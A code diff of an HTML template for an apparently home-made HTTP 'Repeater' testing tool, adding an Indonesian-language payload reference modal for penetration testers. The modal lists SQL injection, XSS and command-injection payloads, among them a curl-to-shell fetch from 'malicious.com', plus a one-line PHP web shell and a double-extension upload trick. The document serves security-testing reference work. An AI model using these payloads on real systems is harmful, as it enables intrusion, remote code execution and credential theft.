@@ -7,44 +7,6 @@
     <link href="{{ url_for('static', filename='css/repeater_styles.css') }}" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <title>Repeater</title>
-    <style>
-        /* Modal styling */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            overflow: auto;
-            background-color: rgba(0, 0, 0, 0.5); /* Background overlay */
-        }
-
-        .modal-content {
-            background-color: #fefefe;
-            margin: auto;
-            padding: 20px;
-            width: 80%;
-            max-width: 1000px;
-            border-radius: 8px;
-            position: relative;
-        }
-
-        .close {
-            color: #aaa;
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        .close:hover,
-        .close:focus {
-            color: #000;
-            text-decoration: none;
-        }
-    </style>
 </head>
 <body>
 
@@ -92,11 +54,12 @@
     <div class="request-response-container">
         <div class="request-container">
             <h5>Request</h5>
-            <form id="modifyRequestForm">
+            <form id="modifyRequestForm"  class="button-group mt-2">
                 <label for="requestData">Request Data:</label>
                 <textarea id="requestData" name="requestData" class="form-control" rows="15" placeholder="Enter full request here"></textarea><br>
                 <button type="button" id="send-request" class="btn btn-primary mt-2">Send Request</button>
                 <button type="button" id="save-request" class="btn btn-secondary mt-2">Save Request</button>
+                <button type="button" id="btn-documentation" class="btn btn-info mt-2">Documentation</button>
             </form>
         </div>
 
@@ -119,161 +82,133 @@
     </div>
 </div>
 
+<!-- Modal for Documentation -->
+<div id="documentationModal" class="modal">
+    <div class="modal-content">
+        <span class="close-documentation">&times;</span>
+        <h3>Payload Documentation</h3>
+        <p>Referensi ke <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">Payloads All the Things</a></p>
+        <ul>
+            <!-- SQL Injection -->
+            <li>
+                <h4>SQL Injection</h4>
+                <ul>
+                    <li>
+                        <h5>Authentication Bypass</h5>
+                        <p><code>' OR '1'='1'</code></p>
+                        <p>Skenario: Digunakan untuk melewati otentikasi pada formulir login yang tidak divalidasi dengan baik.</p>
+                    </li>
+                    <li>
+                        <h5>UNION Based Injection</h5>
+                        <p><code>' UNION SELECT username, password FROM users --</code></p>
+                        <p>Skenario: Mendapatkan informasi sensitif dari tabel lain melalui *output* aplikasi.</p>
+                    </li>
+                    <li>
+                        <h5>Time-Based Blind Injection</h5>
+                        <p><code>' AND SLEEP(5) --</code></p>
+                        <p>Skenario: Menguji kerentanan *blind SQL injection* tanpa memerlukan respon dari server.</p>
+                    </li>
+                    <li>
+                        <h5>Error-Based Injection</h5>
+                        <p><code>' AND 1=CONVERT(int, 'text')</code></p>
+                        <p>Skenario: Memanfaatkan pesan kesalahan dari server untuk mendapatkan informasi skema database.</p>
+                    </li>
+                    <li>
+                        <h5>Boolean-Based Blind Injection</h5>
+                        <p><code>' AND 1=1 --</code> (benar) <br> <code>' AND 1=2 --</code> (salah)</p>
+                        <p>Skenario: Menguji kerentanan berdasarkan perubahan perilaku server berdasarkan ekspresi logika.</p>
+                    </li>
+                </ul>
+            </li>
+            <!-- XSS -->
+            <li>
+                <h4>Cross-Site Scripting (XSS)</h4>
+                <ul>
+                    <li>
+                        <h5>Basic Payload</h5>
+                        <p><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+                        <p>Skenario: Memeriksa input yang tidak tervalidasi pada aplikasi berbasis web.</p>
+                    </li>
+                    <li>
+                        <h5>Image Tag Payload</h5>
+                        <p><code>&lt;img src="x" onerror="alert('XSS');"&gt;</code></p>
+                        <p>Skenario: Mengeksploitasi atribut `onerror` untuk menjalankan skrip berbahaya.</p>
+                    </li>
+                    <li>
+                        <h5>Event Handler Payload</h5>
+                        <p><code>&lt;button onclick="alert('XSS')"&gt;Click Me&lt;/button&gt;</code></p>
+                        <p>Skenario: Menyisipkan *payload* melalui atribut *event listener* HTML.</p>
+                    </li>
+                    <li>
+                        <h5>DOM-Based XSS</h5>
+                        <p><code>&lt;input onfocus="alert('XSS')"&gt;</code></p>
+                        <p>Skenario: Mengeksploitasi elemen DOM yang memuat data tanpa validasi.</p>
+                    </li>
+                </ul>
+            </li>
+            <!-- Command Injection -->
+            <li>
+                <h4>Command Injection</h4>
+                <ul>
+                    <li>
+                        <h5>Basic Payload</h5>
+                        <p><code>; ls -la</code></p>
+                        <p>Skenario: Mengeksekusi perintah dasar untuk menguji kerentanan injeksi perintah.</p>
+                    </li>
+                    <li>
+                        <h5>Chaining Commands</h5>
+                        <p><code>&amp;&amp; whoami</code></p>
+                        <p>Skenario: Menggabungkan perintah untuk mendapatkan informasi pengguna sistem.</p>
+                    </li>
+                    <li>
+                        <h5>Testing Blind Command Injection</h5>
+                        <p><code>; ping -c 5 127.0.0.1</code></p>
+                        <p>Skenario: Menguji injeksi perintah dengan dampak yang tidak langsung terlihat.</p>
+                    </li>
+                    <li>
+                        <h5>Remote Code Execution</h5>
+                        <p><code>; curl http://malicious.com/shell.sh | sh</code></p>
+                        <p>Skenario: Menjalankan skrip dari sumber eksternal pada server korban.</p>
+                    </li>
+                </ul>
+            </li>
+            <!-- File Upload Payloads -->
+            <li>
+                <h4>File Upload Payloads</h4>
+                <ul>
+                    <li>
+                        <h5>Basic PHP Web Shell</h5>
+                        <p><code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
+                        <p>Skenario: Mengunggah file untuk menjalankan perintah pada server korban.</p>
+                    </li>
+                    <li>
+                        <h5>Image with Embedded Script</h5>
+                        <p>File gambar dengan ekstensi ganda: <code>image.php.jpg</code></p>
+                        <p>Skenario: Menyisipkan skrip dalam file yang terlihat seperti file gambar.</p>
+                    </li>
+                </ul>
+                <p>Referensi lebih lengkap: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" target="_blank">File Upload Payloads</a></p>
+            </li>
+            <!-- Additional References -->
+            <li>
+                <h4>Referensi Tambahan</h4>
+                <ul>
+                    <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank">Payloads All the Things</a></li>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank">OWASP Testing Guide</a></li>
+                    <li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Reverse Shell Cheat Sheet</a></li>
+                    <li><a href="https://portswigger.net/web-security" target="_blank">PortSwigger Web Security Academy</a></li>
+                </ul>
+            </li>
+        </ul>
+    </div>
+</div>
+
+
 <footer>
     <p>©2024 Burp Site. All Rights Reserved.</p>
 </footer>
 
-<script>
-    let currentResponseData = null;
-    let currentFlowId = null;
-
-    function showRequest(flow_id) {
-        fetch(`/repeater/request/${flow_id}`)
-            .then(response => response.json())
-            .then(data => {
-                const requestData = `${data.method} ${data.path} HTTP/1.1\nHost: ${data.host}\n${formatHeaders(data.headers)}\n\n${data.body}`;
-                document.getElementById('requestData').value = requestData;
-                currentFlowId = flow_id;
-                document.getElementById('save-request').disabled = false;
-            })
-            .catch(error => {
-                console.error('Error fetching request:', error);
-            });
-    }
-
-    document.getElementById('send-request').addEventListener('click', function() {
-        const requestData = document.getElementById('requestData').value;
-        const parsedRequest = parseRequestData(requestData);
-
-        fetch('/repeater/send', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(parsedRequest)
-        })
-        .then(response => {
-            const contentType = response.headers.get("content-type");
-            if (contentType && contentType.includes("application/json")) {
-                return response.json().then(data => {
-                    currentResponseData = {
-                        "raw": `${data.status}\n${formatHeaders(data.headers)}\n\n${data.body}`,
-                        "html": data.body
-                    };
-                    showResponseAsRaw(); // Default view
-                });
-            } else {
-                return response.text().then(text => {
-                    currentResponseData = {
-                        "raw": text,
-                        "html": text
-                    };
-                    showResponseAsRaw(); // Default view
-                });
-            }
-        })
-        .catch(error => {
-            console.error('Error sending request:', error);
-            document.getElementById('response-body').textContent = 'Error: ' + error.message;
-        });
-    });
-
-    document.getElementById('save-request').addEventListener('click', function() {
-        const requestData = document.getElementById('requestData').value;
-        const parsedRequest = parseRequestData(requestData);
-
-        if (currentFlowId) {
-            fetch(`/repeater/save/${currentFlowId}`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(parsedRequest)
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert("Request saved successfully.");
-                } else {
-                    alert("Failed to save the request.");
-                }
-            })
-            .catch(error => {
-                console.error('Error saving request:', error);
-                alert('Error: ' + error.message);
-            });
-        } else {
-            alert("No request selected to save.");
-        }
-    });
-
-    function parseRequestData(requestData) {
-        const lines = requestData.split('\n');
-        const [method, path] = lines[0].split(' ');
-        const hostLine = lines.find(line => line.startsWith('Host:'));
-        const host = hostLine ? hostLine.split(' ')[1] : '';
-        const headerLines = lines.slice(1, lines.indexOf(''));
-        const headers = {};
-
-        headerLines.forEach(line => {
-            const [key, ...value] = line.split(':');
-            if (key && value) {
-                headers[key.trim()] = value.join(':').trim();
-            }
-        });
-
-        const body = lines.slice(lines.indexOf('') + 1).join('\n');
-
-        return {
-            method: method,
-            host: host,
-            path: path,
-            headers: headers,
-            body: body
-        };
-    }
-
-    document.getElementById('view-json').addEventListener('click', showResponseAsRaw);
-    document.getElementById('view-html').addEventListener('click', showResponseAsHTML);
-
-    function showResponseAsRaw() {
-        if (currentResponseData) {
-            document.getElementById('response-body').innerHTML = `<pre>${escapeHTML(currentResponseData.raw)}</pre>`;
-        }
-    }
-
-    function showResponseAsHTML() {
-        if (currentResponseData) {
-            const modal = document.getElementById("htmlResponseModal");
-            const iframe = document.getElementById("responseIframe");
-
-            const blob = new Blob([currentResponseData.html], { type: 'text/html' });
-            iframe.src = URL.createObjectURL(blob);
-
-            modal.style.display = "block";
-        }
-    }
-
-    document.querySelector(".close").onclick = function () {
-        document.getElementById("htmlResponseModal").style.display = "none";
-    }
-
-    window.onclick = function (event) {
-        const modal = document.getElementById("htmlResponseModal");
-        if (event.target === modal) {
-            modal.style.display = "none";
-        }
-    };
-
-    function escapeHTML(text) {
-        const div = document.createElement('div');
-        div.textContent = text;
-        return div.innerHTML;
-    }
-
-    function formatHeaders(headers) {
-        return Object.entries(headers).map(([key, value]) => `${key}: ${value}`).join('\n');
-    }
-</script>
+<script src="{{ url_for('static', filename='js/repeater.js') }}"></script>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
